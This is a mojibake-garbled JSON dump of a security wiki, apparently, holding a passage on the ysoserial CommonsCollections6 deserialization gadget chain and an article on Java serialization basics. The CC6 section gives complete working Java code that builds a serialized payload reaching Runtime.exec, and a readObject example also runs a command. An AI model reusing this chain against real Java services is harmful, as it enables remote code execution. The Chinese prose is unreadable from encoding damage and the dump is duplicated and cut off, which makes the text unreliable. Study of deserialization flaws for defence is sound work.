å©ç¨é¾åæ\n\n\n# èæ¯\n\næä»¬å¨åæcc1æ¶ä½¿ç¨çjdkçæ¬æ¶8u65ï¼å¦æä½¿ç¨é«äº8u71çæ¬çjdkåæ æ³å©ç¨cc1é¾ãè¿æ¯å ä¸ºå¨é«çæ¬çjdkä¸­æ¹è¿äºannotationinvocationhandlerçreadobjectæ¹æ³çå©ç¨é»è¾ãå¨ysoserialä¸­ï¼cc6è§£å³äºé«çæ¬jdkæ æ³ä½¿ç¨çé®é¢ï¼æ¯ysoserialæ¯è¾éç¨åå¨è½çä¸æ¡é¾ãä½æ¯è¿æ¡å©ç¨é¾è¿æ¯éè¦ä¾é commonscollections3.2.2ä»¥ä¸ççæ¬ã\n\n\n# å©ç¨é¾åæ\n\næä»¬å¨cc1ä¸­åæè¿ï¼ysoserialä¸­ä½¿ç¨çlazymapåæä»¬ä½¿ç¨çtransformedmapæä¸ç¹åºå«ï¼lazymapä½¿ç¨çæ¯annotationinvokerhandlerçinvokeæ¹æ³è°ç¨å¶setæ¹æ³ãèè¦æ§è¡invokeæ¹æ³éè¦åè£ä¸ä¸ªå¨æä»£çå¯¹è±¡ãèæ¬æ¬¡çcc6é¾åæ ·æ¯è°ç¨lazymapå®ç°çï¼åé¢çé½æ¯ä¸è´çï¼åªæ¯å¥å£å°setæ¹æ³ä½ç½®ä¸ä¸è´ãä¸é¢æ¯cc6çè°ç¨é¾ã\n\n\tgadget chain:\n\t    java.io.objectinputstream.readobject()\n            java.util.hashset.readobject()\n                java.util.hashmap.put()\n                java.util.hashmap.hash()\n                    org.apache.commons.collections.keyvalue.tiedmapentry.hashcode()\n                    org.apache.commons.collections.keyvalue.tiedmapentry.getvalue()\n                        org.apache.commons.collections.map.lazymap.get()\n                            org.apache.commons.collections.functors.chainedtransformer.transform()\n                            org.apache.commons.collections.functors.invokertransformer.transform()\n                            java.lang.reflect.method.invoke()\n                                java.lang.runtime.exec()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nä»lazymapçgetå¼å§ï¼åä¸å¯»æ¾åªéè°ç¨äºgetæ¹æ³ï¼å¹¶ä¸æä»¬åæ°å¯æ§ãæ ¹æ®è¿æ¡gadget chainï¼æä»¬æ¾å°äºtiedmapentry.getvalueæ¹æ³ãå¨getvalueä¸­è°ç¨äºmapçgetæ¹æ³ãèmapæ¯å¯ä»¥éè¿æåæé ä¼ å¥çã\n\n\n\næä»¬å°è¯æé ä¸ä¸ï¼\n\npackage com.pwddd.cc6;\n\nimport org.apache.commons.collections.transformer;\nimport org.apache.commons.collections.functors.chainedtransformer;\nimport org.apache.commons.collections.functors.constanttransformer;\nimport org.apache.commons.collections.functors.invokertransformer;\nimport org.apache.commons.collections.keyvalue.tiedmapentry;\nimport org.apache.commons.collections.map.lazymap;\n\nimport java.util.calendar;\nimport java.util.hashmap;\nimport java.util.map;\n\npublic class cc6 {\n    public static void main(string[] args) {\n\n        // 1. chains\n        transformer[] transformers = new transformer[]{\n                new constanttransformer(runtime.class),\n                new invokertransformer(\n                        "getmethod",\n                        new class[]{string.class,class[].class},\n                        new object[]{"getruntime",null}\n                ),\n                new invokertransformer(\n                        "invoke",\n                        new class[]{object.class, object[].class},\n                        new object[]{null, null}\n                ),\n                new invokertransformer(\n                        "exec",\n                        new class[]{string.class},\n                        new object[]{"/system/applications/calculator.app/contents/macos/calculator"}\n                )\n        };\n\n        chainedtransformer chainedtransformer = new chainedtransformer(transformers);\n\n        hashmap<object, object> map = new hashmap<>();\n        map lazymap = lazymap.decorate(map, chainedtransformer);\n        // lazymap.get("bbb");\n        tiedmapentry tiedmapentry = new tiedmapentry(lazymap, "aaa");\n        tiedmapentry.getvalue();\n        \n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\nä¸é¢çä»£ç åºæ¬é½æ¯ç±»ä¼¼çï¼åé¢ä½¿ç¨tiedmapentityå°è£äºlazymapï¼å¹¶è°ç¨getvalueæ¹æ³ãè½å¤æ§è¡ç¸åºçç»æã\n\n\n\næ¢ç¶å°tiedmapentityè¿ä¸æ­¥è½å¤æ§è¡ï¼å°±éè¦ç»§ç»­å¯»æ¾åªéè°ç¨äºgetvalueæ¹æ³ãå¨tiedmapentityä¸­çhashcodeæ¹æ³ä¸­è°ç¨äºgetvalueæ¹æ³ãhashcodeæ¹æ³æä»¬å·²ç»å¾çæäºï¼å¨urldnsä¸­ï¼ä¹æ¯å©ç¨äºhashmapçhashcodeæ¹æ³ã\n\n\n\né£ä¹æåæ¬¡å°è¯è°ç¨ä¸ä¸ï¼\n\ntiedmapentry tiedmapentry = new tiedmapentry(lazymap, "aaa");\n//        tiedmapentry.getvalue();\ntiedmapentry.hashcode();\n\n\n1\n2\n3\n\n\nåç°æ¯å¯ä»¥çï¼é£ä¹åªéåè°ç¨äºhashcodeæ¹æ³ï¼å¹¶ä¸è°ç¨hashcodeçå¯¹è±¡æä»¬å¯ä»¥æ§å¶å¢ï¼\n\nå¨urldnsä¸­ï¼æä»¬ç¥éhashmapä¸­çhashæ¹æ³ä¼å¯¹æä»¬ä¼ å¥çkeyåhashï¼ä¼æç¨keyçhashcodeæ¹æ³ãå æ­¤åªéè¦å°tiedmapentityä½ä¸ºhashmapçkeyå³å¯ã\n\nhashmap<object, object> hashmap = new hashmap<>();\nhashmap.put(tiedmapentry,"bbb");\n\n\n1\n2\n\n\nå¨putæ¶ä¹ä¼å¼¹åºè®¡ç®å¨ï¼è¿æ¯å ä¸ºå¨hashmapçputæ¹æ³ä¸­ä¹ä¼è®¡ç®keyçhashå¼ï¼æä»¬å¯ä»¥åä¸å°æä»¬çchainedtransformerå°è£è¿å»ï¼è¿æ ·å°±æ æ³è°ç¨äºã\n\nmap lazymap = lazymap.decorate(map, new constanttransformer(1));\n\nclass<lazymap> clazz = lazymap.class;\nfield factory = clazz.getdeclaredfield("factory");\nfactory.setaccessible(true);\nfactory.set(lazymap,transformers);\n\n\n1\n2\n3\n4\n5\n6\n\n\næä»¬å°è¯å°çæçå¯¹è±¡åºååä¹åï¼åååºååãä»ç¶æ æ³å¼¹åºè®¡ç®å¨ãæä»¬è·è¸ªä¸ä¸ä»£ç çä¸ä¸ï¼\n\n\n\næä»¬çå°å½æ§è¡å°è¿éçæ¶åï¼mapä¸­å·²ç»ækeyä¸ºaaaçæ°æ®äºï¼é£ä¹å°±ä¸ä¼æ§è¡ä¸é¢çtransformæ¹æ³ãå æ­¤æä»¬éè¦æaaaçkeyç§»é¤ï¼è¿æ ·å¨ååºååçæ¶åï¼mapéé¢æ²¡æå¯¹åºçkeyæå¯ä»¥æ§è¡ã\n\nå®æ´çä»£ç å¦ä¸ï¼\n\npublic static void main(string[] args) throws exception {\n\n  // 1. chains\n  transformer[] transformers = new transformer[]{\n    new constanttransformer(runtime.class),\n    new invokertransformer(\n      "getmethod",\n      new class[]{string.class,class[].class},\n      new object[]{"getruntime",null}\n    ),\n    new invokertransformer(\n      "invoke",\n      new class[]{object.class, object[].class},\n      new object[]{null, null}\n    ),\n    new invokertransformer(\n      "exec",\n      new class[]{string.class},\n      new object[]{"/system/applications/calculator.app/contents/macos/calculator"}\n    )\n  };\n\n  chainedtransformer chainedtransformer = new chainedtransformer(transformers);\n\n  hashmap<object, object> map = new hashmap<>();\n  map lazymap = lazymap.decorate(map, new constanttransformer(1));\n\n  tiedmapentry tiedmapentry = new tiedmapentry(lazymap, "aaa");\n\n  hashmap<object, object> hashmap = new hashmap<>();\n  hashmap.put(tiedmapentry, "bbb");\n  lazymap.remove("aaa");\n\n  field factoryfield = lazymap.class.getdeclaredfield("factory");\n  factoryfield.setaccessible(true);\n  factoryfield.set(lazymap,chainedtransformer);\n\n\n  serialize(hashmap);\n  deserialize();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"ååºååæ¼æ´åç - ååºåå",frontmatter:{title:"ååºååæ¼æ´åç - ååºåå",date:"2022-05-25T00:00:00.000Z",permalink:"/sec/vuln/deserialization/serialization",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"åå",categories:["æ¼æ´åç","ååºååæ¼æ´"],tags:["ååºåå","æ¼æ´åç"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/201.%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/2010.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/04.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html",relativePath:"02.å®å¨/201.æ¼æ´åç/2010.ååºååæ¼æ´/04.ååºåååç-ååºåå.md",key:"v-47cbce6b",path:"/sec/vuln/deserialization/serialization/",headers:[{level:2,title:"ä»ä¹æ¯ååºåå",slug:"ä»ä¹æ¯ååºåå",normalizedTitle:"ä»ä¹æ¯ååºåå",charIndex:74},{level:2,title:"Javaååºåå",slug:"javaååºåå",normalizedTitle:"javaååºåå",charIndex:377},{level:3,title:"åºååè¿ç¨",slug:"åºååè¿ç¨",normalizedTitle:"åºååè¿ç¨",charIndex:515},{level:3,title:"ååºååè¿ç¨",slug:"ååºååè¿ç¨",normalizedTitle:"ååºååè¿ç¨",charIndex:5258},{level:2,title:"ååºååæ¼æ´",slug:"ååºååæ¼æ´",normalizedTitle:"ååºååæ¼æ´",charIndex:2}],headersStr:"ä»ä¹æ¯ååºåå Javaååºåå åºååè¿ç¨ ååºååè¿ç¨ ååºååæ¼æ´",content:'# ååºååæ¼æ´åç - ååºåå\n\n> åé¢è¯´è¿ååºååçåºç¡åå°ç¸å³çç¥è¯ï¼è¦äºè§£ååºååæ¼æ´è¿å¿é¡»ç¥éJavaçååºååç¸å³çåå®¹ã\n\n\n# ä»ä¹æ¯ååºåå\n\nè¦æ³ç¥éä»ä¹æ¯ååºååï¼é¦åéè¦äºè§£ä½ä¸ºåºååãæ²¡ææ¥è§¦è¿ç¼ç¨è¯­è¨çå¯è½å¯¹è¿ä¸ªè¯ä¸çæãæä»¬è¦å°æ°æ®ä¿å­ãä¼ è¾ï¼å°±éè¦ç¨å°åºååææ¯ãæè°åºååï¼å°å¯¹è±¡è½¬åä¸ºè½å¤å¨ç¡¬çä¸ãæ°æ®åºä¸­ä¿å­ãå¨ç½ç»ä¸ä¼ è¾çä¸ä¸²åºåãå¸¸è§çå°å¯¹è±¡ä¿å­å°æä»¶ãæ°æ®åºé½ç®æ¯åºååãå¦æå­å¨ä¸¤ä¸ªç³»ç»ï¼Aç³»ç»éè¦Bç³»ç»ä¸­çæä¸ªå¯¹è±¡ï¼é£ä¹å¯¹è±¡ä¸å¯è½ç´æ¥å©ç¨ç½ç»åéï¼äºæ¯Bç³»ç»å°æ°æ®åºååï¼ç¶ååéç»Aï¼Aæ¶å°åºååçæ°æ®ä¹åï¼åéè¿ååºååï¼è·å¾åæ¥çå¯¹è±¡ãç®åæ¥è®²ï¼åºååå°±æ¯å°å¯¹è±¡è½¬åæå¯å¨ç½ç»ä¼ è¾ãå¯ä¿å­çåºåçè¿ç¨ï¼ååºååå°±æ¯å°åºååçä¸²è½¬åä¸ºåæ¥çå¯¹è±¡çè¿ç¨ Jsonå¶å®ä¹æ¯ä¸ç§åºååçæä½ãæä»¬ä¸é¢ä»ç»Javaååºååçè¿ç¨ã\n\n\n# Javaååºåå\n\nJavaä¸­å­å¨ä¸ä¸ªIOæµçæ¦å¿µï¼ä¸ç®¡æ¯æä»¶æä½è¿æ¯åºååååºååé½æ¯éè¿IOæµå®æçãæè°IOæµå¯ä»¥ç®åçè§£ä¸ºä¸ä¸ªæ°´ç®¡ï¼è¿é¨åä¸äºè§£çå¯ä»¥ççJavaåºç¡ä¸­å³äºIOæµçé¨åãæä»¬è¿éè¦è¯´çæ¯å¯¹è±¡æµï¼è¾å¥ãè¾åºï¼ã\n\n\n# åºååè¿ç¨\n\nJavaä¸­åºååæä»¶ä½¿ç¨å°çæ¯ObjectOutputStreamãå¾å¥½çè§£ï¼å°±æ¯å°Objectå¯¹è±¡è¾åºãé£ä¹è¾åºå°åªå¢ï¼å¶å®æå¾å¤ç§éæ©ï¼å¯ä»¥è¾åºå°æä»¶ï¼ä¹å¯ä»¥è¾åºå°byte[]æ°ç»ä¸­ãåªè¦ç¨ æ°´ç®¡å¥æ°´ç®¡å°±å¥½äºãä¸é¢æ¯å°Studentå¯¹è±¡åºååå°æä»¶çè¿ç¨ï¼\n\nStudentå¯¹è±¡å®ä¹ä¸ºå¦ä¸ï¼\n\npackage com.pwddd.basic;\n\n\npublic class Student {\n  private String name;\n  private String password;\n  private int age;\n\n\n  public void sayHello(){\n    System.out.println("helloworldï¼"+name);\n  }\n  private void sayFuck(){\n    System.out.println("fuckï¼"+name);\n  }\n\n\n  @Override\n  public String toString() {\n    return "Student{" +\n      "name=\'" + name + \'\\\'\' +\n      ", password=\'" + password + \'\\\'\' +\n      ", age=" + age +\n      \'}\';\n  }\n\n  public Student() {\n  }\n\n  public Student(String name, String password, int age) {\n    this.name = name;\n    this.password = password;\n    this.age = age;\n  }\n\n  public String getName() {\n    return name;\n  }\n\n  public void setName(String name) {\n    this.name = name;\n  }\n\n  public String getPassword() {\n    return password;\n  }\n\n  public void setPassword(String password) {\n    this.password = password;\n  }\n\n  public int getAge() {\n    return age;\n  }\n\n  public void setAge(int age) {\n    this.age = age;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\npublic static void main(String[] args) throws IOException {\n  Student student = new Student("zhangsan", "123456", 12);\n  FileOutputStream fos = new FileOutputStream("./student.ser");\n  ObjectOutputStream oos = new ObjectOutputStream(fos);\n  oos.writeObject(student);\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nå½è¿è¡è¿æ®µåºååçä»£ç æ¶ï¼ä¼æ¥éãè¿æ¯å ä¸ºå¨Javaä¸­ï¼ä¸ä¸ªå¯¹è±¡æ³è¦è¢«åºååï¼éè¦å®ç°åºååçæ¥å£ï¼implements Serializableãå¹¶ä¸éè¦çæä¸ä¸ªserialVersionUIDã\n\n\n\nè¿ä¸ªserialVersionUIDæ¯ç¨æ¥è¾å©å¯¹è±¡çåºååä¸ååºååçï¼ååä¸åºåååçæ°æ®å½ä¸­çserialVersionUIDä¸å½åç±»å½ä¸­çserialVersionUIDä¸è´ï¼é£ä¹è¯¥å¯¹è±¡æè½è¢«ååºååæåãè¿ä¸ªserialVersionUIDçè¯¦ç»çå·¥ä½æºå¶æ¯ï¼å¨åºååçæ¶åç³»ç»å°serialVersionUIDåå¥å°åºååçæä»¶ä¸­å»ï¼å½ååºååçæ¶åç³»ç»ä¼åå»æ£æµæä»¶ä¸­çserialVersionUIDæ¯å¦è·å½åçæä»¶çserialVersionUIDæ¯å¦ä¸è´ï¼å¦æä¸è´åååºååæåï¼å¦åå°±è¯´æå½åç±»è·åºåååçç±»åçäºååï¼æ¯å¦æ¯æååéçæ°éæèæ¯ç±»ååçäºååï¼é£ä¹å¨ååºååæ¶å°±ä¼åçcrashï¼å¹¶ä¸åæ¥åºéè¯¯ï¼\n\njava.io.InvalidClassException: User; local class incompatible: stream\nclassdesc serialVersionUID = -1451587475819212328, local class\nserialVersionUID = -3946714849072033140at\njava.io.ObjectStreamClass.initNonProxy(ObjectStreamClass.java:699)at\njava.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1885)at\njava.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1751)at\njava.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2042)at\njava.io.ObjectInputStream.readObject0(ObjectInputStream.java:1573)at\njava.io.ObjectInputStream.readObject(ObjectInputStream.java:431)at\nMain.readUser(Main.java:32)at Main.main(Main.java:10)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\néæ°è¿è¡è¿æ®µä»£ç ï¼ä¼åç°çæäºä¸ä¸ªåºååçæä»¶ãè¯¥æä»¶åå®¹æ æ³ç¨ææ¬å·¥å·æå¼ï¼å¯ä»¥ä½¿ç¨ä¸é¨çå·¥å·è¯»åä¿¡æ¯ï¼\n\nhttps://github.com/NickstaDB/SerializationDumper\n\n\n\nä½¿ç¨å·¥å·è·åæä»¶ä¿¡æ¯ï¼\n\nSTREAM_MAGIC - 0xac ed\nSTREAM_VERSION - 0x00 05\nContents\n  TC_OBJECT - 0x73\n    TC_CLASSDESC - 0x72\n      className\n        Length - 23 - 0x00 17\n        Value - com.pwddd.basic.Student - 0x636f6d2e70776464642e62617369632e53747564656e74\n      serialVersionUID - 0xc0 01 30 4c 21 c0 5e b7\n      newHandle 0x00 7e 00 00\n      classDescFlags - 0x02 - SC_SERIALIZABLE\n      fieldCount - 3 - 0x00 03\n      Fields\n        0:\n          Int - I - 0x49\n          fieldName\n            Length - 3 - 0x00 03\n            Value - age - 0x616765\n        1:\n          Object - L - 0x4c\n          fieldName\n            Length - 4 - 0x00 04\n            Value - name - 0x6e616d65\n          className1\n            TC_STRING - 0x74\n              newHandle 0x00 7e 00 01\n              Length - 18 - 0x00 12\n              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b\n        2:\n          Object - L - 0x4c\n          fieldName\n            Length - 8 - 0x00 08\n            Value - password - 0x70617373776f7264\n          className1\n            TC_REFERENCE - 0x71\n              Handle - 8257537 - 0x00 7e 00 01\n      classAnnotations\n        TC_ENDBLOCKDATA - 0x78\n      superClassDesc\n        TC_NULL - 0x70\n    newHandle 0x00 7e 00 02\n    classdata\n      com.pwddd.basic.Student\n        values\n          age\n            (int)12 - 0x00 00 00 0c\n          name\n            (object)\n              TC_STRING - 0x74\n                newHandle 0x00 7e 00 03\n                Length - 8 - 0x00 08\n                Value - zhangsan - 0x7a68616e6773616e\n          password\n            (object)\n              TC_STRING - 0x74\n                newHandle 0x00 7e 00 04\n                Length - 6 - 0x00 06\n                Value - 123456 - 0x313233343536\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n\n\nå¯ä»¥çå°æä»¶çå¤´é¨æ¯aced0005ï¼è¿æ¯å¾å¤IDSåè­¦çç¹å¾ä¹ä¸ã\n\n\n# ååºååè¿ç¨\n\nååºååæ¯å°åºååçæçæä»¶æèåºåè¿åä¸ºå¯¹è±¡çè¿ç¨ãå¦ä¸çä»£ç æ¯ååºååçè¿ç¨ï¼\n\nFileInputStream fis = new FileInputStream("./student.ser");\nObjectInputStream ois = new ObjectInputStream(fis);\nStudent student1 = (Student) ois.readObject();\nSystem.out.println(student1); //Student{name=\'zhangsan\', password=\'123456\', age=12}\n\n\n1\n2\n3\n4\n\n\n\n# ååºååæ¼æ´\n\néè¿è·è¸ªJavaååºååçä»£ç ï¼æä»¬åç°ï¼å½æä»¬å»åºåååååºååä¸ä¸ªå¯¹è±¡æ¶ï¼å¦ææä»¬çå¯¹è±¡å­å¨ä¸ä¸ªreadObjectåwriteObjectæ¹æ³ï¼é£ä¹å¨åºåååååºååæ¶ï¼å°±ä¼æ§è¡è¿ä¸ªæ¹æ³ãå¦ä¸æç¤ºï¼\n\nè°ç¨writeObjectï¼\n\nwriteObject:70, Student (com.pwddd.basic)\ninvoke0:-1, NativeMethodAccessorImpl (sun.reflect)\ninvoke:62, NativeMethodAccessorImpl (sun.reflect)\ninvoke:43, DelegatingMethodAccessorImpl (sun.reflect)\ninvoke:498, Method (java.lang.reflect)\ninvokeWriteObject:1155, ObjectStreamClass (java.io)\nwriteSerialData:1496, ObjectOutputStream (java.io)\nwriteOrdinaryObject:1432, ObjectOutputStream (java.io)\nwriteObject0:1178, ObjectOutputStream (java.io)\nwriteObject:348, ObjectOutputStream (java.io)\nmain:10, Serialization (com.pwddd.basic)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nè°ç¨readObjectï¼\n\nreadObject:66, Student (com.pwddd.basic)\ninvoke0:-1, NativeMethodAccessorImpl (sun.reflect)\ninvoke:62, NativeMethodAccessorImpl (sun.reflect)\ninvoke:43, DelegatingMethodAccessorImpl (sun.reflect)\ninvoke:498, Method (java.lang.reflect)\ninvokeReadObject:1185, ObjectStreamClass (java.io)\nreadSerialData:2319, ObjectInputStream (java.io)\nreadOrdinaryObject:2210, ObjectInputStream (java.io)\nreadObject0:1690, ObjectInputStream (java.io)\nreadObject:508, ObjectInputStream (java.io)\nreadObject:466, ObjectInputStream (java.io)\nmain:13, Serialization (com.pwddd.basic)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\né£ä¹ï¼å¦ææä»¬ååºååçå¯¹è±¡æreadObjectæ¹æ³ï¼å¹¶ä¸å¨è¯¥æ¹æ³ä¸­æä¸ä¸ªæ¶æçä»£ç ï¼å¨ååºååçæ¶åå°±ä¼æ§è¡è¿ä¸ä¸²æ¶æä»£ç ã\n\nprivate void readObject(ObjectInputStream objectInputStream) throws IOException {\n  Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");\n}\n\n\n1\n2\n3\n\n\nè½ç¶è¿ç§ä»£ç åºæ¬ä¸ä¼åºç°ï¼ä½æ¯æä»¬å¯ä»¥éè¿å±å±åµå¥ç­æ¹å¼ï¼è¾¾å°æä»¬çç®çã\n\n----------------------------------------\n\nååå°è¿ï¼æ»è§å¾æç¹æªå°½ãä½æ¯å·²ç»ä¸ç¥éåä»ä¹äºã',normalizedContent:'# ååºååæ¼æ´åç - ååºåå\n\n> åé¢è¯´è¿ååºååçåºç¡åå°ç¸å³çç¥è¯ï¼è¦äºè§£ååºååæ¼æ´è¿å¿é¡»ç¥éjavaçååºååç¸å³çåå®¹ã\n\n\n# ä»ä¹æ¯ååºåå\n\nè¦æ³ç¥éä»ä¹æ¯ååºååï¼é¦åéè¦äºè§£ä½ä¸ºåºååãæ²¡ææ¥è§¦è¿ç¼ç¨è¯­è¨çå¯è½å¯¹è¿ä¸ªè¯ä¸çæãæä»¬è¦å°æ°æ®ä¿å­ãä¼ è¾ï¼å°±éè¦ç¨å°åºååææ¯ãæè°åºååï¼å°å¯¹è±¡è½¬åä¸ºè½å¤å¨ç¡¬çä¸ãæ°æ®åºä¸­ä¿å­ãå¨ç½ç»ä¸ä¼ è¾çä¸ä¸²åºåãå¸¸è§çå°å¯¹è±¡ä¿å­å°æä»¶ãæ°æ®åºé½ç®æ¯åºååãå¦æå­å¨ä¸¤ä¸ªç³»ç»ï¼aç³»ç»éè¦bç³»ç»ä¸­çæä¸ªå¯¹è±¡ï¼é£ä¹å¯¹è±¡ä¸å¯è½ç´æ¥å©ç¨ç½ç»åéï¼äºæ¯bç³»ç»å°æ°æ®åºååï¼ç¶ååéç»aï¼aæ¶å°åºååçæ°æ®ä¹åï¼åéè¿ååºååï¼è·å¾åæ¥çå¯¹è±¡ãç®åæ¥è®²ï¼åºååå°±æ¯å°å¯¹è±¡è½¬åæå¯å¨ç½ç»ä¼ è¾ãå¯ä¿å­çåºåçè¿ç¨ï¼ååºååå°±æ¯å°åºååçä¸²è½¬åä¸ºåæ¥çå¯¹è±¡çè¿ç¨ jsonå¶å®ä¹æ¯ä¸ç§åºååçæä½ãæä»¬ä¸é¢ä»ç»javaååºååçè¿ç¨ã\n\n\n# javaååºåå\n\njavaä¸­å­å¨ä¸ä¸ªioæµçæ¦å¿µï¼ä¸ç®¡æ¯æä»¶æä½è¿æ¯åºååååºååé½æ¯éè¿ioæµå®æçãæè°ioæµå¯ä»¥ç®åçè§£ä¸ºä¸ä¸ªæ°´ç®¡ï¼è¿é¨åä¸äºè§£çå¯ä»¥ççjavaåºç¡ä¸­å³äºioæµçé¨åãæä»¬è¿éè¦è¯´çæ¯å¯¹è±¡æµï¼è¾å¥ãè¾åºï¼ã\n\n\n# åºååè¿ç¨\n\njavaä¸­åºååæä»¶ä½¿ç¨å°çæ¯objectoutputstreamãå¾å¥½çè§£ï¼å°±æ¯å°objectå¯¹è±¡è¾åºãé£ä¹è¾åºå°åªå¢ï¼å¶å®æå¾å¤ç§éæ©ï¼å¯ä»¥è¾åºå°æä»¶ï¼ä¹å¯ä»¥è¾åºå°byte[]æ°ç»ä¸­ãåªè¦ç¨ æ°´ç®¡å¥æ°´ç®¡å°±å¥½äºãä¸é¢æ¯å°studentå¯¹è±¡åºååå°æä»¶çè¿ç¨ï¼\n\nstudentå¯¹è±¡å®ä¹ä¸ºå¦ä¸ï¼\n\npackage com.pwddd.basic;\n\n\npublic class student {\n  private string name;\n  private string password;\n  private int age;\n\n\n  public void sayhello(){\n    system.out.println("helloworldï¼"+name);\n  }\n  private void sayfuck(){\n    system.out.println("fuckï¼"+name);\n  }\n\n\n  @override\n  public string tostring() {\n    return "student{" +\n      "name=\'" + name + \'\\\'\' +\n      ", password=\'" + password + \'\\\'\' +\n      ", age=" + age +\n      \'}\';\n  }\n\n  public student() {\n  }\n\n  public student(string name, string password, int age) {\n    this.name = name;\n    this.password = password;\n    this.age = age;\n  }\n\n  public string getname() {\n    return name;\n  }\n\n  public void setname(string name) {\n    this.name = name;\n  }\n\n  public string getpassword() {\n    return password;\n  }\n\n  public void setpassword(string password) {\n    this.password = password;\n  }\n\n  public int getage() {\n    return age;\n  }\n\n  public void setage(int age) {\n    this.age = age;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\npublic static void main(string[] args) throws ioexception {\n  student student = new student("zhangsan", "123456", 12);\n  fileoutputstream fos = new fileoutputstream("./student.ser");\n  objectoutputstream oos = new objectoutputstream(fos);\n  oos.writeobject(student);\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nå½è¿è¡è¿æ®µåºååçä»£ç æ¶ï¼ä¼æ¥éãè¿æ¯å ä¸ºå¨javaä¸­ï¼ä¸ä¸ªå¯¹è±¡æ³è¦è¢«åºååï¼éè¦å®ç°åºååçæ¥å£ï¼implements serializableãå¹¶ä¸éè¦çæä¸ä¸ªserialversionuidã\n\n\n\nè¿ä¸ªserialversionuidæ¯ç¨æ¥è¾å©å¯¹è±¡çåºååä¸ååºååçï¼ååä¸åºåååçæ°æ®å½ä¸­çserialversionuidä¸å½åç±»å½ä¸­çserialversionuidä¸è´ï¼é£ä¹è¯¥å¯¹è±¡æè½è¢«ååºååæåãè¿ä¸ªserialversionuidçè¯¦ç»çå·¥ä½æºå¶æ¯ï¼å¨åºååçæ¶åç³»ç»å°serialversionuidåå¥å°åºååçæä»¶ä¸­å»ï¼å½ååºååçæ¶åç³»ç»ä¼åå»æ£æµæä»¶ä¸­çserialversionuidæ¯å¦è·å½åçæä»¶çserialversionuidæ¯å¦ä¸è´ï¼å¦æä¸è´åååºååæåï¼å¦åå°±è¯´æå½åç±»è·åºåååçç±»åçäºååï¼æ¯å¦æ¯æååéçæ°éæèæ¯ç±»ååçäºååï¼é£ä¹å¨ååºååæ¶å°±ä¼åçcrashï¼å¹¶ä¸åæ¥åºéè¯¯ï¼\n\njava.io.invalidclassexception: user; local class incompatible: stream\nclassdesc serialversionuid = -1451587475819212328, local class\nserialversionuid = -3946714849072033140at\njava.io.objectstreamclass.initnonproxy(objectstreamclass.java:699)at\njava.io.objectinputstream.readnonproxydesc(objectinputstream.java:1885)at\njava.io.objectinputstream.readclassdesc(objectinputstream.java:1751)at\njava.io.objectinputstream.readordinaryobject(objectinputstream.java:2042)at\njava.io.objectinputstream.readobject0(objectinputstream.java:1573)at\njava.io.objectinputstream.readobject(objectinputstream.java:431)at\nmain.readuser(main.java:32)at main.main(main.java:10)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\néæ°è¿è¡è¿æ®µä»£ç ï¼ä¼åç°çæäºä¸ä¸ªåºååçæä»¶ãè¯¥æä»¶åå®¹æ æ³ç¨ææ¬å·¥å·æå¼ï¼å¯ä»¥ä½¿ç¨ä¸é¨çå·¥å·è¯»åä¿¡æ¯ï¼\n\nhttps://github.com/nickstadb/serializationdumper\n\n\n\nä½¿ç¨å·¥å·è·åæä»¶ä¿¡æ¯ï¼\n\nstream_magic - 0xac ed\nstream_version - 0x00 05\ncontents\n  tc_object - 0x73\n    tc_classdesc - 0x72\n      classname\n        length - 23 - 0x00 17\n        value - com.pwddd.basic.student - 0x636f6d2e70776464642e62617369632e53747564656e74\n      serialversionuid - 0xc0 01 30 4c 21 c0 5e b7\n      newhandle 